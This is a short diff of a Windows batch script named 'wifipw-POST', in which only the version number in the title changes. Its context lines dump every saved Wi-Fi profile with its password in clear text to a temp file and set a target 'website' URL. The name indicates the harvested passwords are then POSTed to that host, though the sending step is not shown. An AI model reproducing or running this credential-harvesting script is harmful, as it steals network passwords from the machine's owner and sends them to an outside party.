@@ -1,4 +1,4 @@
-@echo off && color a && cls && TITLE wifipw-POSTv1.0 by Whiteavocado and reveloperboy
+@echo off && color a && cls && TITLE wifipw-POSTv1.1 by Whiteavocado and reveloperboy
 netsh wlan show profile * key=clear>>%tmp%\wifi.url
 ::vars:
 set "website=http://website.com"
